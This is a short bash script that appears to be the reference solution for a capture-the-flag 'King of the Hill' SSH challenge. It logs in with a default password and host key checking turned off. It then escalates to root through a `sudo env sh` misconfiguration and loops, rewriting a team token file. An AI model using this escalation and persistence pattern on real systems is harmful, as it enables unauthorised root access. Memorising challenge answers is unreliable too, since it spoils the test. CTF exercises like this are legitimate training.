#!/usr/bin/env bash
# Reference holder for the Citadel (SSH KotH). Needs `sshpass`.
#   ./solve.sh HOST PORT <team_token> [password]
# SSH in as player, escalate to root via `sudo env`, then hold the citadel by
# re-writing your team token into /koth/king every 15s (CTFd scores each tick).
set -euo pipefail
HOST="${1:?usage: solve.sh HOST PORT <team_token> [password]}"
PORT="${2:?port}"
TOKEN="${3:?team token (from the CTFd King of the Hill page)}"
PW="${4:-player}"

sshpass -p "$PW" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -p "$PORT" "player@$HOST" \
  "sudo env sh -c 'echo [+] holding citadel as \$(id -un); while true; do printf %s \"$TOKEN\" > /koth/king; sleep 15; done'"
